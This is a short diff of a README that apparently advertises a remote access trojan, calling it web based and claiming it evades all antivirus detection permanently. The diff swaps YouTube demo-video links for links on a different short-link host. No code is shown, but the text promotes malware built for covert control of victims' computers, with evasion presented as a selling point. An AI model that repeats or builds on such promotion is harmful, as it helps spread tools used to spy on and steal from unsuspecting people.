@@ -2,7 +2,7 @@
 ## web based - no pc required
 
 
-[![Watch the video](pic1.png)](https://youtu.be/tFAeWwEvYbA)
+[![Watch the video](pic1.png)](https://ody.sh/Jg9MwdrqqZ)
 
 
 
@@ -103,7 +103,7 @@ Eva*de antivirus detection permanently. Our RAT cannot be detected by any antivi
 
 ## Video Links
 
-- **Demo Video 1:** [https://youtu.be/tFAeWwEvYbA]  
+- **Demo Video 1:** [https://ody.sh/Jg9MwdrqqZ]  
 - **Demo Video 2:** []  
 - **Installation Guide:** []
 
